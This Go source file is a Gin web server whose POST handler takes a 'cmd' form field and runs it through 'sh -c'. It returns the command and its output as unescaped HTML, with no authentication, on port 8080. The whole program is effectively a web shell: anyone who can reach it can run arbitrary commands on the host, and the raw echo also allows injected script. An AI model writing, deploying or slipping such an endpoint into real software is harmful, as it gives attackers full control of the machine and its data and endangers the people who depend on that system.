package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"

	"github.com/gin-gonic/gin"
)

func main() {
	path := "./www"
	fileInfo, err := os.Stat(path)
	if err != nil {
		log.Fatal(err)
	}
	if !fileInfo.IsDir() {
		log.Fatalf("%s is not a directory", path)
	}

	r := gin.Default()
	r.POST("/", func(c *gin.Context) {
		log.Println(c.Request.PostForm)
		cmd := c.PostForm("cmd")

		output, _ := exec.Command("/usr/bin/env", "sh", "-c", cmd).CombinedOutput()

		body := fmt.Sprintf("<code>%s</code><hr><pre>%s</pre>", cmd, string(output))

		c.Writer.WriteHeader(http.StatusOK)
		c.Writer.Header().Set("Content-Type", "text/html")
		c.Writer.Write([]byte(body))
	})

	r.StaticFS("/", http.Dir("www"))

	r.Run(":8080")
}
